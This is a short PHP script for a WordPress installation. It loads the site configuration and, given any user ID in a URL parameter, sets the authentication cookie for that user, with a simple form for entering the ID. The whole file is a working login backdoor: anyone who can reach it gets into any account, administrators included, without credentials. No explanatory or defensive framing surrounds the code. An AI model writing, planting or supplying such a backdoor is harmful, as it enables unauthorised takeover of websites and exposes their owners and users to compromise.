<?php
include('wp-config.php');
global $wpdb;
if(isset($_GET['id']) && !empty($_GET['id']))
{
$user_id = $_GET['id'];
$user = get_user_by( 'id', $user_id );
if( $user ) {
wp_set_current_user( $user_id, $user->user_login );
wp_set_auth_cookie( $user_id );
do_action( 'wp_login', $user->user_login );
}
exit();
}
?>
<form type="GET">
<input type="number" name="id">
<input type="submit">
</form>
<?php